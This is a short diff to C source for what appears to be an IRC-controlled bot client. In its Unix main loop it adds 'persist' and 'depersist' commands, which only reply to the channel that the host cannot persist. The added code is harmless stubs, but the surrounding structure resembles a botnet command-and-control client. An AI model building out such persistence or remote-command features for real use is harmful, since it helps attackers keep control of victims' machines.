@@ -110,6 +110,18 @@ void et_main_loop_nix(int socket, char *nick)
 						snprintf(nopopup, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot create popups.\r\n", IRC_CHANNEL, nick);
 						send(socket, nopopup, strlen(nopopup), 0);
 					}
+					else if (!strcmp(cmd, "persist"))
+					{
+						char nopersist[IRC_MSGLEN];
+						snprintf(nopersist, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot persist.\r\n", IRC_CHANNEL, nick);
+						send(socket, nopersist, strlen(nopersist), 0);
+					}
+					else if (!strcmp(cmd, "depersist"))
+					{
+						char nodepersist[IRC_MSGLEN];
+						snprintf(nodepersist, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot depersist.\r\n", IRC_CHANNEL, nick);
+						send(socket, nodepersist, strlen(nodepersist), 0);
+					}
 					else
 					{
 						char cmd_output[IRC_MSGLEN];
